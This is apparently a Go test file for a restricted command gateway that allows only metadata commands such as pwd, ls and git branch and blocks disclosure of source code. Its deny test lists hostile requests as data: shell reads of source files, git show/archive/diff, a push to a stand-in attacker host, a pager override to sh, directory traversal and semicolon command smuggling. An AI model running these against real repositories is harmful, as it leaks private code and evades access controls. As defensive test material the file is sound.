package restrictedpolicy

import (
 "errors"
 "os"
 "path/filepath"
 "strings"
 "testing"
)

func setupGit(t *testing.T) string {
 t.Helper()
 root:=t.TempDir()
 if err:=os.Mkdir(filepath.Join(root,".git"),0700);err!=nil{t.Fatal(err)}
 if err:=os.WriteFile(filepath.Join(root,".git","HEAD"),[]byte("ref: refs/heads/develop/restricted\n"),0600);err!=nil{t.Fatal(err)}
 if err:=os.WriteFile(filepath.Join(root,"main.go"),[]byte("SECRET SOURCE CONTENT"),0600);err!=nil{t.Fatal(err)}
 return root
}
func TestSafeGatewayMetadataOnly(t *testing.T) {
 root:=setupGit(t)
 p:=Default()
 for _,test:=range []struct {req CommandRequest;contains string}{
  {CommandRequest{Command:"pwd"},"workspace: ."},
  {CommandRequest{Command:"ls"},"main.go"},
  {CommandRequest{Command:"git",Args:[]string{"branch","--show-current"}},"develop/restricted"},
  {CommandRequest{Command:"git",Args:[]string{"rev-parse","--abbrev-ref","HEAD"}},"develop/restricted"},
 } {
  result,err:=RunCommand(root,p,test.req)
  if err!=nil {t.Fatalf("%+v: %v",test.req,err)}
  if !strings.Contains(result.Output,test.contains) {t.Fatalf("%+v unexpected output %q",test.req,result.Output)}
  if strings.Contains(result.Output,"SECRET SOURCE CONTENT"){t.Fatal("source content disclosure")}
 }
}
func TestSecureGatewayDeniesShellAndGitExfil(t *testing.T) {
 root:=setupGit(t)
 p:=Default()
 reqs:=[]CommandRequest{
  {Command:"sh",Args:[]string{"-c","cat main.go"}},
  {Command:"git",Args:[]string{"show","HEAD:main.go"}},
  {Command:"git",Args:[]string{"archive","HEAD"}},
  {Command:"git",Args:[]string{"cat-file","-p","HEAD"}},
  {Command:"git",Args:[]string{"diff"}},
  {Command:"git",Args:[]string{"push","https://attacker.invalid/repo"}},
  {Command:"git",Args:[]string{"-c","core.pager=sh","status"}},
  {Command:"ls",Args:[]string{".."}},
  {Command:"pwd",Args:[]string{";cat","main.go"}},
  {Command:"pwd;cat",Args:[]string{"main.go"}},
  {Command:"pwd",Args:[]string{"\n"}},
 }
 for _,req:=range reqs{
  _,err:=RunCommand(root,p,req)
  if !errors.Is(err,ErrCommandDenied){t.Fatalf("%+v must be denied, got %v",req,err)}
 }
}
func TestGatewayObeysExplicitCommandGroupPolicy(t *testing.T){
 root:=setupGit(t)
 p:=Default();p.AllowedCommands=[]string{"ls"}
 if _,err:=RunCommand(root,p,CommandRequest{Command:"git",Args:[]string{"branch","--show-current"}});!errors.Is(err,ErrCommandDenied){t.Fatal("git allowed without group")}
 if _,err:=RunCommand(root,p,CommandRequest{Command:"pwd"});!errors.Is(err,ErrCommandDenied){t.Fatal("pwd allowed without group")}
 if _,err:=RunCommand(root,p,CommandRequest{Command:"ls"});err!=nil{t.Fatal(err)}
}
func TestGitMetadataDoesNotFollowGitDirSymlink(t *testing.T) {
 root:=t.TempDir()
 outside:=setupGit(t)
 if err:=os.Symlink(filepath.Join(outside,".git"),filepath.Join(root,".git"));err!=nil{t.Fatal(err)}
 p:=Default()
 _,err:=RunCommand(root,p,CommandRequest{Command:"git",Args:[]string{"branch","--show-current"}})
 if !errors.Is(err,ErrCommandDenied){t.Fatalf("gitdir symlink permitted: %v",err)}
}
